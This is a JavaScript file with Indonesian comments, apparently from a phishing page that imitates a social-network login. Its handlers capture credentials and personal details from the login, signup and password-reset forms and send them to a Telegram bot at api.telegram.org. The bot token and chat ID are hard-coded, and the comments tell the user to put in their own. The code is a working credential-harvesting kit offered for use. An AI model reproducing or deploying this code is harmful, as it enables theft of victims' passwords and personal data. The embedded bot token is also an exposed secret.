// Fungsi untuk mengirim pesan ke Telegram
async function sendToTelegram(message) {
    const botToken = '7512836049:AAHB9STFF0Qxzg5ryLs6Gc7idtdBFJJBGYE'; // Ganti dengan token bot Anda
    const chatId = '7377733784';    // Ganti dengan chat ID Anda
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });
        const data = await response.json();
        console.log('Message sent to Telegram:', data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Fungsi untuk menangani form login
document.getElementById('login-form')?.addEventListener('submit', function(event) {
    event.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = `Login attempt:\nEmail: ${email}\nPassword: ${password}`;
    alert(message);
    sendToTelegram(message); // Kirim data ke Telegram
});

// Fungsi untuk menangani form signup
document.getElementById('signup-form')?.addEventListener('submit', function(event) {
    event.preventDefault();
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const email = document.getElementById('signup-email').value;
    const password = document.getElementById('signup-password').value;
    const birthday = document.getElementById('birthday').value;
    const gender = document.getElementById('gender').value;
    const message = `Signup attempt:\nName: ${firstName} ${lastName}\nEmail: ${email}\nPassword: ${password}\nBirthday: ${birthday}\nGender: ${gender}`;
    alert(message);
    sendToTelegram(message); // Kirim data ke Telegram
});

// Fungsi untuk menangani form forgot password
document.getElementById('forgot-password-form')?.addEventListener('submit', function(event) {
    event.preventDefault();
    const searchAccount = document.getElementById('search-account').value;
    const message = `Forgot Password attempt:\nEmail/Phone: ${searchAccount}`;
    alert(message);
    sendToTelegram(message); // Kirim data ke Telegram
});